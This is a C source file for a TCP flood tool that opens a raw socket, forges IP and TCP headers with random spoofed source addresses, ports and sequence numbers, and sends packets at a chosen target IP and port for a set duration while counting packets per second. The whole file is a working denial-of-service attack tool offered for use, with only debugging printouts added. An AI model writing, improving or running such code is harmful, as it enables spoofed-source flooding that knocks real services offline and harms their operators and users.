/*
 * Debug TCP Flood - High Performance Version with Debugging
 * Released under GNU GPL License v3.0
 * Added debugging to diagnose issues
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <errno.h>
#include <stdint.h>
#include <time.h>

#define MAX_PACKET_SIZE 4096

// Structure to hold configuration
typedef struct {
    char *target_ip;
    uint16_t target_port;
    int duration;
    struct {
        int ack, syn, psh, fin, rst, urg, ptr, res2, seq;
    } tcp_flags;
} Config;

// Structure to hold packet data
typedef struct {
    struct iphdr ip;
    struct tcphdr tcp;
    char buffer[MAX_PACKET_SIZE];
} Packet;

// TCP pseudo header for checksum
struct tcp_pseudo {
    uint32_t src_addr;
    uint32_t dst_addr;
    uint8_t zero;
    uint8_t proto;
    uint16_t length;
};

// Global variables for performance
static volatile uint64_t packets_sent = 0;
static uint32_t xorshift_state = 1;
static uint8_t *tcp_csum_buffer = NULL; // Pre-allocated buffer for TCP checksum

// Improved random number generator (Xorshift)
void init_xorshift(uint32_t seed) {
    xorshift_state = seed ? seed : (uint32_t)time(NULL);
    printf("Initialized xorshift with seed: %u\n", xorshift_state);
}

uint32_t xorshift() {
    uint32_t x = xorshift_state;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    xorshift_state = x;
    return x;
}

// Enhanced checksum calculation
uint16_t csum(uint16_t *buf, int len) {
    uint32_t sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len > 0) {
        sum += *(uint8_t *)buf;
    }
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return (uint16_t)(~sum);
}

// Calculate TCP checksum (optimized)
uint16_t tcp_csum(struct iphdr *iph, struct tcphdr *tcph) {
    struct tcp_pseudo pseudo = {
        .src_addr = iph->saddr,
        .dst_addr = iph->daddr,
        .zero = 0,
        .proto = IPPROTO_TCP,
        .length = htons(sizeof(struct tcphdr))
    };
    int total_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    memcpy(tcp_csum_buffer, &pseudo, sizeof(struct tcp_pseudo));
    memcpy(tcp_csum_buffer + sizeof(struct tcp_pseudo), tcph, sizeof(struct tcphdr));
    return csum((uint16_t *)tcp_csum_buffer, total_len);
}

// Initialize IP header
void init_ip_header(struct iphdr *iph, in_addr_t saddr, in_addr_t daddr) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htons(xorshift() % 65535);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = saddr;
    iph->daddr = daddr;
    iph->check = 0;
}

// Initialize TCP header
void init_tcp_header(struct tcphdr *tcph, uint16_t sport, uint16_t dport, Config *config) {
    tcph->source = htons(sport);
    tcph->dest = htons(dport);
    tcph->seq = xorshift();
    tcph->ack_seq = config->tcp_flags.seq ? xorshift() : 0;
    tcph->doff = 5;
    tcph->ack = config->tcp_flags.ack;
    tcph->syn = config->tcp_flags.syn;
    tcph->psh = config->tcp_flags.psh;
    tcph->fin = config->tcp_flags.fin;
    tcph->rst = config->tcp_flags.rst;
    tcph->urg = config->tcp_flags.urg;
    tcph->urg_ptr = config->tcp_flags.ptr ? xorshift() % 65535 : 0;
    tcph->res2 = config->tcp_flags.res2;
    tcph->window = htons(xorshift() % 65535);
    tcph->check = 0;
}

// Parse TCP flags
void parse_tcp_flags(Config *config, const char *flag_str) {
    config->tcp_flags.ack = strstr(flag_str, "ack") ? 1 : 0;
    config->tcp_flags.syn = strstr(flag_str, "syn") ? 1 : 0;
    config->tcp_flags.psh = strstr(flag_str, "psh") ? 1 : 0;
    config->tcp_flags.fin = strstr(flag_str, "fin") ? 1 : 0;
    config->tcp_flags.rst = strstr(flag_str, "rst") ? 1 : 0;
    config->tcp_flags.urg = strstr(flag_str, "urg") ? 1 : 0;
    config->tcp_flags.ptr = strstr(flag_str, "ptr") ? 1 : 0;
    config->tcp_flags.res2 = strstr(flag_str, "res2") ? 1 : 0;
    config->tcp_flags.seq = strstr(flag_str, "seq") ? 1 : 0;
    printf("Parsed TCP flags: ack=%d, syn=%d, psh=%d, fin=%d, rst=%d, urg=%d, ptr=%d, res2=%d, seq=%d\n",
           config->tcp_flags.ack, config->tcp_flags.syn, config->tcp_flags.psh,
           config->tcp_flags.fin, config->tcp_flags.rst, config->tcp_flags.urg,
           config->tcp_flags.ptr, config->tcp_flags.res2, config->tcp_flags.seq);
}

// Main function
int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <target_ip> <port> <duration> <tcp_flags>\n", argv[0]);
        return 1;
    }

    Config config = {
        .target_ip = argv[1],
        .target_port = atoi(argv[2]),
        .duration = atoi(argv[3])
    };
    parse_tcp_flags(&config, argv[4]);
    init_xorshift(time(NULL));

    // Pre-allocate buffer for TCP checksum
    int total_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    tcp_csum_buffer = malloc(total_len);
    if (!tcp_csum_buffer) {
        fprintf(stderr, "Failed to allocate memory for TCP checksum buffer\n");
        return 1;
    }
    printf("Allocated TCP checksum buffer of size %d bytes\n", total_len);

    // Setup socket
    struct sockaddr_in sin = {
        .sin_family = AF_INET,
        .sin_port = htons(config.target_port),
        .sin_addr.s_addr = inet_addr(config.target_ip)
    };
    if (sin.sin_addr.s_addr == INADDR_NONE) {
        fprintf(stderr, "Invalid target IP address: %s\n", config.target_ip);
        free(tcp_csum_buffer);
        return 1;
    }
    printf("Target IP: %s, Port: %d\n", config.target_ip, config.target_port);

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        fprintf(stderr, "Failed to create raw socket: %s (are you running as root?)\n", strerror(errno));
        free(tcp_csum_buffer);
        return 1;
    }
    printf("Raw socket created successfully (fd: %d)\n", sock);

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        fprintf(stderr, "Failed to set IP_HDRINCL: %s\n", strerror(errno));
        close(sock);
        free(tcp_csum_buffer);
        return 1;
    }
    printf("IP_HDRINCL set successfully\n");

    printf("Starting flood on %s:%d for %d seconds...\n", config.target_ip, config.target_port, config.duration);

    // High-performance packet sending loop
    struct timespec start_time, current_time;
    clock_gettime(CLOCK_MONOTONIC, &start_time);
    Packet packet;
    uint64_t last_reported = 0;

    while (1) {
        clock_gettime(CLOCK_MONOTONIC, &current_time);
        double elapsed = (current_time.tv_sec - start_time.tv_sec) +
                         (current_time.tv_nsec - start_time.tv_nsec) / 1e9;
        if (elapsed >= config.duration) break;

        memset(&packet, 0, sizeof(Packet));
        init_ip_header(&packet.ip, xorshift(), sin.sin_addr.s_addr);
        init_tcp_header(&packet.tcp, xorshift() % 65535, config.target_port, &config);
        packet.ip.check = csum((uint16_t *)&packet.ip, sizeof(struct iphdr));
        packet.tcp.check = tcp_csum(&packet.ip, &packet.tcp);

        if (sendto(sock, &packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                   (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            fprintf(stderr, "Send failed: %s\n", strerror(errno));
        } else {
            packets_sent++;
            if (packets_sent % 10000 == 0 && packets_sent != last_reported) {
                printf("Sent %llu packets so far...\n", packets_sent);
                last_reported = packets_sent;
            }
        }
    }

    // Calculate and display PPS
    double total_time = (current_time.tv_sec - start_time.tv_sec) +
                        (current_time.tv_nsec - start_time.tv_nsec) / 1e9;
    double pps = packets_sent / total_time;
    printf("Flood completed. Sent %llu packets in %.2f seconds (%.0f PPS)\n",
           packets_sent, total_time, pps);

    close(sock);
    free(tcp_csum_buffer);
    return 0;
}